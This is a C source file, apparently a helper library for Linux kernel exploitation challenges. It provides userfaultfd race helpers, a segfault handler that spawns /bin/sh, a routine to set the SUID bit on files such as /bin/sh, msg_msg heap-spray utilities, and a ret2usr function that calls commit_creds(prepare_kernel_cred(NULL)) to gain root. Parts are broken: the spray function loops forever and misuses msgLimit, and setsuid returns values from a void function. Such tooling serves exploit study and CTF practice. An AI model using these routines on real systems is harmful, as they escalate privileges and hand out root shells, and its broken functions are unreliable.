#include "libx.h"

#define MSGMNB_FILE "/proc/sys/kernel/msgmnb"

/*
Utils 
*/

size_t fread_u64(const char *fname)
{
    size_t size = 0x100;
	FILE *f = fopen(fname, "r");
	char *buf = calloc(1,size+1);
	fread(buf, 1, size, f);
	buf[size] = 0;
	fclose(f);
	return atoll(buf);
}
size_t MSGLIMIT =0 ;
size_t msgLimit(){
    if(!MSGLIMIT){
        return fread_u64(MSGMNB_FILE);
    }else{
        return MSGLIMIT;
    }
}
void warn(const char* text) {
    // Yellow color code
    printf("\033[0;33m");
    printf("%s", text);
    // Reset to default color
    printf("\033[0m\n");
}

void panic(const char *text){
    // Red color code
    printf("\033[0;31m");
    printf("%s", text);
    // Reset to default color
    printf("\033[0m\n");
    exit(0x132);
}
void shell(){
    if(!getuid())
        system("/bin/sh");
    else
        panic("[!] Failed to Escape");
}
void info(size_t val){
    // Blue color code
    printf("\033[0;34m[+] ");
    printf("%p", val);
    // Reset to default color
    printf("\033[0m\n");
}

/*
Userfaultfd for race condition,
Usage:
    size_t *ptr = forze();
*/
void* userfaultfd_leak_handler(void* arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long) arg;
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    
    nready = poll(&pollfd, 1, -1);
    sleep(100000);
    if (nready != 1)
    {
        panic("Wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0)
    {
        panic("msg err");
    }

    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        panic("[-] mmap err");
    }
    struct uffdio_copy uc;
    // init page
    memset(page, 0, sizeof(page));
    uc.src = (unsigned long) page;
    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    return NULL;
}
void  RegisterUserfault(void *fault_page)
{
    void *handler = userfaultfd_leak_handler;
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        panic("ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; 
    ur.range.len   = PAGE_SIZE;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) 
        panic("ioctl-UFFDIO_REGISTER");

    int s = pthread_create(&thr, NULL,handler, (void*)uffd);

    if (s!=0)
        panic("pthread_create");
}
size_t * froze(){
    size_t *ptr=mmap(0xdeadbeef000,0x1000,5,0x21,0,0);
    if (ptr!=0xdeadbeef000)
        panic("[x] Froze zone");
    RegisterUserfault(ptr);
    return ptr;
}
/*
save_status for ret2user
*/
// void save_status()
// {
//     __asm__("mov user_cs, cs;"
//             "mov user_ss, ss;"
//             "mov user_sp, rsp;"
//             "pushf;"
//             "pop user_rflags;"
//             );
//     puts("[*] status has been saved.");
// }



/*
    Part I: Basics, not specific-technique-related
*/

/*
    Name: Set a Handler of Segfault
    Desc:
        If kernel Heap is borken we can use to process a SEGFAULT and spawn a shell
*/
void sigsegv_handler(int sig, siginfo_t *si, void *unused) {
    
    puts("[+] Libx: SegFault Handler is spwaning a shell...");
    system("/bin/sh");
    while(1); // Techniquly, we never his this line
}
void hook_segfault(){
    struct sigaction sa;
    memset(&sa, 0, sizeof(sigaction));
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_SIGINFO;
    sa.sa_sigaction = sigsegv_handler;

    if (sigaction(SIGSEGV, &sa, NULL) == -1) {
        perror("sigaction");
        exit(EXIT_FAILURE);
    }
}


/*
    Name: Set SUID for a prorgam
    Desc:
        Provide the name of file. Try to setsuid for it. 
    Example:
        setsuid("/bin/sh");
*/
void setsuid(char *filename){
    mode_t mode = S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH;

    // Attempt to set the suid bit along with the owner's execute permission and read/execute for group and others
    if (chmod(filename, mode) == -1) {
        perror("chmod failed to set suid bit");
        return 1;
    }
    printf("Successfully set suid bit on %s\n", filename);
    return 0;
}
/*
    Name: Stop the process for debugging
    Desc:
        Stop the process for debugging
    Example:
        debug();
*/
void debug(){
    puts("[!] DEBUG");
    char buf[0x10];
    read(0,buf,0xf);
}
/*
    Name:p64
    Desc:
        Return a heap pointer of little endian packed 64bit value
    Example:
        p64(0xdeadbeef);
*/
__u8 *p64(size_t val){
    char *res  = malloc(0x18);
    memset(res,0,0x18);
    size_t * p = res;
    * p = val;
    return res;
}

/*
    Part II: MSGMSG related
*/

/*
    Name: msgGet/msgQueue
    Desc:
        Provide a path, return the msgid
    Example:
        msgQueueCreate("/Home/user/1");
*/
int msgGet(){
    int res= msgget(0,01644);
    if(res<0)
        panic("[-] Failed to create a msg queue");
    return res;
}
// int msgQueueCreate(char *s){ // Obsoleted
//     key_t key;
//     mkdir(s, 0755);
//     // Generate a unique key for the message queue
//     key = ftok(s, 'A');
//     if (key == -1) {
//         perror("ftok");
//         return 1;
//     }
//     int msgid;
//     // Create a message queue
//     msgid = msgget(key, 0666 | IPC_CREAT);
//     if (msgid == -1) {
//         perror("msgget");
//         return 1;
//     }
//     return msgid;
// }
/*
    Name: msgQueueSend/msgSend
    Desc:
        Insert a new message to a msgqueue
    Example:
        msgQueueSend(msgid,"libx",5,1);
*/
void msgSend(int msgid,char *text,size_t size,size_t type){
    msgQueueSend(msgid,text,size,type);
    return ;
}
void msgQueueSend(int msgid,char *text,size_t size,size_t type){
    
    msgQueueMsg* msg = (msgQueueMsg *)malloc(sizeof(long)+size+0x1);
    msg->mtype = type; // Message type (can be any positive integer)
    strncpy(msg->mtext, text, size);
    // Send the message
    if (syscall(SYS_msgsnd, msgid, msg, size, 0) == -1) {
        perror("msgsnd");
        return ;
    }
    free(msg);
    return ;  
}
/*
    Name: msgQueueRecv/msgRecv
    Desc:
        Remove (a) message(s) from msgqueue
    Example:
        msgQueueRecv(msgid,0x1000,0);
*/
msgQueueMsg* msgRecv(int msgid,size_t size,size_t type){
    return msgQueueRecv(msgid,size,type);
}
msgQueueMsg* msgQueueRecv(int msgid,size_t size,size_t type){
    msgQueueMsg* recv = (msgQueueMsg *)malloc(sizeof(long)+size+1);
    if (syscall(SYS_msgrcv, msgid, recv, size, type, 0|010000) == -1) {
        perror("msgrcv");
        return NULL;
    }
    return recv;

}
/*
    Name: msgQueueDel/msgDel
    Desc:
        Delete a mesage queue
    Example:
        msgQueueDel(msgid);
*/
void msgDel(int msgid){
    msgQueueDel(msgid);
}
void msgQueueDel(int msgid){
    if (msgctl(msgid, IPC_RMID, NULL) == -1)
        perror("msgctl");
    return; 
}

/*
    Name: msgSpray
    Desc:
        Duplicate a byte n times and return the allocated chunk
    Example:
        dp('\xff',0x88);
*/
void _msgQueueSpray(){
    ;
}
void msgSpray(size_t msg_len,size_t num){
    size_t msg_object_size = msg_len+0x30;
    if( msg_object_size > msgLimit ) panic("[-] The size of msg object is larger than the limit of msg queue");
    if( msg_object_size > PAGE_SIZE) warn("[!] Msg object size > PAGE_SIZE, this could not be what you want");
    size_t max_msg_num_pre_queue = msgLimit() / msg_object_size;
    while(num>0){
        _msgQueueSpray();
    }
    

}


/*
    Name: Dup one byte
    Desc:
        Duplicate a byte n times and return the allocated chunk
    Example:
        dp('\xff',0x88);
*/
__u8 * dp(__u8 * c,size_t n){
    __u8* res = malloc(n+1);
    memset(res,c,n);
    res[n] = NULL;
    return res;
}


/*
    Name: flatn
    Desc:
        pack n size_t values by p64
    Example:
        sizez_t values = {1,2,3,4,5};
        flat(values);
*/
__u8 * flatn(size_t *values,size_t n){
    size_t * res = malloc(sizeof(size_t)*n+1);
    for(int i = 0 ; i < n; i++){
        res[i] = values[i];
    }
    return (__u8 *)res;
}

/*
    Name: findp64
    Desc:
        find a specific pointer in a chunk of memory
        and return the offset
    Example:
        sizez_t off = findp64(stack,0x100,0xdeadbeef)
*/

size_t findp64(__u8 *stack,size_t value, size_t n){
    size_t * ptr;
    if(n<8)
        panic("[-] There is not enough space for searching");
    for(size_t i =0 ; i <= n-8; i++){
        ptr = stack+i;
        if(value == *ptr)
            return i;
    }
    return NULL;
}
/*
    Name: str
    Desc:
        transform a int to string
    Example:
        char *ptr = str(123);
*/
char *str(int a){
    char *res = malloc(0x100);
    sprintf(res, "%d", a);
    return res;
}
/*
    Name: strdupn
    Desc:
        load a string to heap
    Example:
        char *ptr = strdupn("n132",0x28);
*/
char *strdupn(char *s, size_t size){
    char * res = calloc(1,size);
    strcpy(res,s);
    return res;
}
/*
    Name: mmapx(addr,size)
    Desc:
        a wrapper of mmap
    Example:
        d
*/

void *mmapx(void *addr, size_t size)
{
	return mmap(addr, size, 7 , 0x21, -1, 0);
}





//  Part III: ret2usr


/*
    Name: getRootPrivilige
    Desc:
        getRootPrivilige for ret2usr.
        Before hitting this chal, 
        set commit_creds, prepare_kernel_cred, back2user

    Example:
        getRootPrivilige(msgid);
*/
size_t commit_creds = NULL;
size_t prepare_kernel_cred = NULL;
void (*back2user)()=NULL;

void getRootPrivilige()
{
    if(prepare_kernel_cred==NULL || commit_creds == NULL)
        panic("[-] prepare_kernel_cred or commit_creds is not set.");
    
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
    if(back2user==NULL)
        panic("[-] back2user is not set.");
    back2user();
}
